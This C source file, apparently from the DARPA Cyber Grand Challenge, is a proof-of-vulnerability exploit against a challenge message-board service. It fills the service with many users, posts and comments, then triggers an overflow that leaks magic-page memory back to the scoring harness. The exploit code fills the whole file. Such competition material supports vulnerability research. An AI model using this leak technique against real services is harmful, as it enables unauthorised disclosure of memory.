/*

Author: Steve Wood <swood@cromulence.com>

Copyright (c) 2016 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/


#include "libcgc.h"
#include "cgc_stdlib.h"
#include "cgc_stdio.h"
#include "cgc_string.h"

int cgc_receive_bytes (int fd, void *buffer, cgc_size_t count) 
{
cgc_size_t total;
cgc_size_t rxbytes;

    total = 0;

    while(total < count)  {

        rxbytes = 0;

        if (cgc_receive(fd, buffer+total, count-total, &rxbytes)==0 ) {

            total += rxbytes;

        }
        
        else {

            return(-1);
        }

    }

return 0;

}


int main(int cgc_argc, char *cgc_argv[])
{

char buffer[1024];
int i;

int pov_type;
unsigned int type2_addr;
unsigned int type2_length;
unsigned int type2_size;
unsigned int new_offset_value;

int retcode;
unsigned int userCode;
unsigned int postID;

	// negotiate a type 2 POV
	pov_type = 2;

	if (cgc_write(3, &pov_type, sizeof(pov_type)) == -1)
		cgc__terminate(-1);

	if (cgc_receive_bytes(3, &type2_addr, sizeof(type2_addr)) == -1)
		cgc__terminate(-1);

	if (cgc_receive_bytes(3, &type2_size, sizeof(type2_size)) == -1)
		cgc__terminate(-1);

	if (cgc_receive_bytes(3, &type2_length, sizeof(type2_length)) == -1)
		cgc__terminate(-1);


	*(unsigned int *)buffer = 0xa0;

	buffer[4] = 5;

	for (i=5; i < 149; ++i )
		buffer[i] = 'a';

	buffer[10] = 1;

	buffer[12] = 138;

	buffer[149] = 2;
	buffer[150] = 1;


	// send the message to add the user
	cgc_write(STDOUT, (void *)buffer, 151);

	cgc_receive_bytes(STDIN, &retcode, 4);

	if (retcode != 0) {

		cgc_printf("something is wrong\n");
		cgc__terminate(-1);
	}

	buffer[12] = 1;

	// now add a bunch of users to move the cgc_read pointer of the file mapped to the magic page towards the end
	for (i = 0; i < 180; ++i ) {

		cgc_sprintf(buffer+7, "$03d", i);
		buffer[10] = 1;

		cgc_write(STDOUT, (void *)buffer, 14);

		cgc_receive_bytes(STDIN, &retcode, 4);

		if (retcode != 0) {

			cgc_printf("something is wrong\n");
			cgc__terminate(-1);
		}
	}

	// now login as the first user
	buffer[0] = 0xb0;
	buffer[4] = 5;

	for (i=5; i < 12; ++i )
		buffer[i] = 'a';

	buffer[10] = 1;

	// send the message to login the user
	cgc_write(STDOUT, (void *)buffer, 12);

	// need to save the returned userCode for making posts
	cgc_receive_bytes(STDIN, &userCode, 4);


	// time to make a first post
	buffer[0] = 0xd0;

	*(unsigned int *)(buffer+4) = userCode;

	// short n sweet message
	buffer[8] = 1;
	buffer[9] = 'a';

	// send the message to make a post
	cgc_write(STDOUT, (void *)buffer, 10);

	// return code is the post's ID
	cgc_receive_bytes(STDIN, &postID, 4);


	// now make a comment on the post
	buffer[0] = 0xe0;

	*(unsigned int *)(buffer+4) = postID;
	*(unsigned int *)(buffer+8) = userCode;

	buffer[12] = 1;
	buffer[13] = 'b';

	cgc_write(STDOUT, (void *)buffer, 14);

	// get the response to the comment
	cgc_receive_bytes(STDIN, &retcode, 4);

	if (retcode != 0 ) {

		cgc_write(2, "comment error\n", 14);
	}

	// now request the specific message to get its comments, which should cause the overflow
	buffer[0] = 0xf0;

	*(unsigned int *)(buffer+4) = postID;

	cgc_write(STDOUT, (void *)buffer, 8);


	// receive the first part of the response
	cgc_receive_bytes(STDIN, buffer, 43);

	retcode = 0x8a;
	// now receive the length of the commenter's name.  If its only 30 bytes, then this is the patched binary
	cgc_receive_bytes(STDIN, &retcode, 4);

	if ( retcode == 0x8a ) {

		cgc_write(2, "exploited", 9);
		cgc_receive_bytes(STDIN, buffer, 0x8a+5+8+8);
		cgc_receive_bytes(STDIN, buffer, 54);
	}
	else {

		cgc_write(2, "patched binary\n", 15);
	}

	// now cgc_write the returned data back to the POV server for scoring
	cgc_write(3, buffer+50, 4);

	// send the command to cgc_exit the CB
	cgc_write(STDOUT, "exit", 4);

}

